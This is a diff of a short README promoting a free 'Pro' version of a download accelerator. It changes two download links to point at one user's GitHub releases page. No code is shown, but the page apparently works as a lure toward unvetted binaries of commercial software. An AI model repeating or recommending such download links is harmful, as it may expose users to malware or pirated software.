@@ -12,7 +12,7 @@ Welcome to the official repository for Internet Download Accelerator Pro Free! H
 
 ## Resources 📁
 
-- **Latest Version Download**: [Click here to download the latest version](https://github.com/files/Project.zip) 🌟
+- **Latest Version Download**: [Click here to download the latest version](https://github.com/podiarconao/Internet-Download-Accelerator-Pro-Free/releases) 🌟
 
 
 ## How to Access the Download Link 📥
@@ -29,4 +29,4 @@ Don't hesitate! Start accelerating your download speeds with Internet Download A
 
 Feel free to explore the repository, download the latest version, and share your experiences with Internet Download Accelerator Pro Free! Thank you for visiting! 🌟
 
-[Visit releases section for more info](https://github.com/Internet-Download-Accelerator-Pro-Free/releases)
+[Visit releases section for more info](https://github.com/podiarconao/Internet-Download-Accelerator-Pro-Free/releases)
